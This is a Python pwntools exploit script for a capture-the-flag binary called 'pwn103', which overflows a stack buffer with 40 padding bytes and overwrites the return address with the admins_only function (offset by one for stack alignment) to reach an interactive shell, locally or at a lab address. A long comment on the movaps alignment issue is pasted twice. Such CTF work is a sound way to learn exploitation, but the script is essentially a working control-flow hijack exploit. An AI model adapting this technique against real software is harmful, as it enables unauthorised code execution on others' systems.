#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn103", checksec=False)

if args.REMOTE:
    p = remote("10.10.102.5", 9003)
else:
    p = process(binary.path)

p.sendlineafter(b"\xE2\x8C\xA8\xEF\xB8\x8F  Choose the channel: ", b"3")

payload = b""
payload += 40*b"A"
# Not
# https://www.reddit.com/r/ExploitDev/comments/i5beqt/error_got_eof_while_reading_in_interactive_in/
# You've encountered the movaps issue. Try using the address of the easy() function plus one (0x40060e) to skip that first push instruction.

# When you hijack this program's return address, you're redirecting execution to the start of a function. x86_64 programs don't expect to enter 
# functions with a misaligned stack, but because you skipped the call instruction that would normally lead into a function, your stack is misaligned by 1 quadword.

# Some x86 instructions (like movaps) are designed to operate on data with a specific alignment, if you don't respect that alignment the instruction 
# will fault. Some versions of GLIBC were compiled with movaps instructions in functions like do_system(), it depends on which version of GCC they 
# were built with. The libc-2.27.so binary that ships with Ubuntu 18.04 is an example of this.You've encountered the movaps issue. Try using the address 
# of the easy() function plus one (0x40060e) to skip that first push instruction.

# When you hijack this program's return address, you're redirecting execution to the start of a function. x86_64 programs don't expect to enter functions 
# with a misaligned stack, but because you skipped the call instruction that would normally lead into a function, your stack is misaligned by 1 quadword.

# Some x86 instructions (like movaps) are designed to operate on data with a specific alignment, if you don't respect that alignment the instruction will 
# fault. Some versions of GLIBC were compiled with movaps instructions in functions like do_system(), it depends on which version of GCC they were built 
# with. The libc-2.27.so binary that ships with Ubuntu 18.04 is an example of this.
payload += p64(binary.sym.admins_only+1)

p.sendlineafter(b"------[pwner]: ", payload)
p.recvuntil(b"Welcome admin \xF0\x9F\x98\x84\n")
p.interactive()
